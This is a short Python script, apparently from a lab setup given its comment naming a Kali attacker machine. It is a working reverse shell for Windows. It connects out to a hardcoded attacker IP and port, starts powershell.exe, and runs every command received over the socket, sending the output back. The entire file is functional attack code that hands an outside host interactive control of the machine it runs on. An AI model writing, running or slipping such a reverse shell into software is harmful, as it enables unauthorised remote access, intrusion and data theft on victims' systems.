import socket
import subprocess

def main():
    attacker_ip = "10.40.85.8"  #IP KALI
    attacker_port = 5555

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))

    # Reverse Shell para powershell
    proc = subprocess.Popen(["powershell.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

    while True:
        command = s.recv(1024).decode("utf-8")
        if command.lower() == "exit":
            break
        proc.stdin.write(command.encode("utf-8") + b"\n")
        proc.stdin.flush()
        output = proc.stdout.read1(4096)
        s.send(output)

    s.close()

if __name__ == "__main__":
    main()